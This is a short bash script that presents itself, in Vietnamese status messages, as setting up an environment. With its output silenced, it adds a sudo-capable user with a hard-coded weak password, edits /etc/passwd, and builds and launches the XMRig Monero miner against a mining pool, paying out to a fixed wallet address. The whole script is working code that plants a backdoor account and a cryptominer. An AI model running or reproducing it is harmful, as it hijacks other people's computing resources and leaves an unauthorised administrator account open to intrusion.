#! /bin/bash
printf "Dang tao moi truong..." >&2
{
sudo useradd -m long
sudo adduser long sudo
echo 'long:1230' | sudo chpasswd
sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
sudo apt-get update
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build && cd xmrig/build
cmake ..
make -j$(nproc)
} &> /dev/null &&
printf "\nXong " >&2 ||
printf "\nLoi " >&2
./xmrig -o pool.minexmr.com:4444 -u 84JEttNYVJiKMqVpnhnp7MhoxWECiZcbg1efDiNSeG2kW3rYj6VfxCFPKVEzLXSgPG2q3LYte4mWZ8QVFh63KE8kL5iXCuN
